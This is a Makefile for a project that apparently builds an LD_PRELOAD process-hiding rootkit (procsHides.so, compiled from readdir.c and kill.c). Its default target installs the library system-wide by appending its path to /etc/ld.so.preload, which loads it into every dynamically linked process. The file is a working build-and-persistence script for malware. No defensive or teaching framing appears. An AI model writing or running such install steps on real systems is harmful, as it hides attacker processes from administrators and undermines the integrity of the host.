#Makefile objectif: clean and perfect
.PHONY: all clean fclean re

# Name of file
NAME		=	procsHides.so
PATH_INSTALL=	/usr/local/lib/

# Name directory
PATH_SRC	=	srcs
PATH_OBJ	=	objs
PATH_LOG	=	logs

# List of sources
SRCS		=	$(addprefix $(PATH_SRC)/, readdir.c kill.c)
OBJS		=	$(addprefix $(PATH_OBJ)/, $(notdir $(SRCS:.c=.o)))
LOG			=	$(PATH_LOG)/$(NAME).log

COMP		=	gcc
COMP_FLAG	=	-Wall -Werror -Wextra
COMP_HIDE	=	-fPIC -shared
COMP_LKN	=	-ldl
# Others Command
RM			=	/bin/rm

# Color Code and template code
_YELLOW		=	\033[38;5;184m
_GREEN		=	\033[38;5;46m
_RESET		=	\033[0m
_INFO		=	[$(_YELLOW)INFO$(_RESET)]
_SUCCESS	=	[$(_GREEN)SUCCESS$(_RESET)]

# Functions
all:	init $(NAME) install
	@ echo "$(_SUCCESS) Compilation done"

init:
	@ $(shell mkdir -p $(PATH_LOG) $(PATH_OBJ))

install:
	@ mv $(NAME) $(PATH_INSTALL)
	@ echo /usr/local/lib/procsHides.so >> /etc/ld.so.preload
	@ echo "$(_SUCCESS) Installation done"
	
$(NAME): $(OBJS)
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) -o $(NAME) $(OBJS) $(COMP_LKN) ) >> $(LOG) 2>&1

$(PATH_OBJ)/%.o : $(PATH_SRC)/%.c
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) -c $< -o $@) >> $(LOG) 2>&1
	@ echo "$(_INFO) Compilation of $*"

clean:
	@ $(RM) -rf $(PATH_OBJ)
	@ echo "$(_INFO) Deleted files and directory"

fclean: clean
	@ $(RM) -rf $(NAME)
	@ $(RM) -rf $(PATH_LOG)

re: fclean all
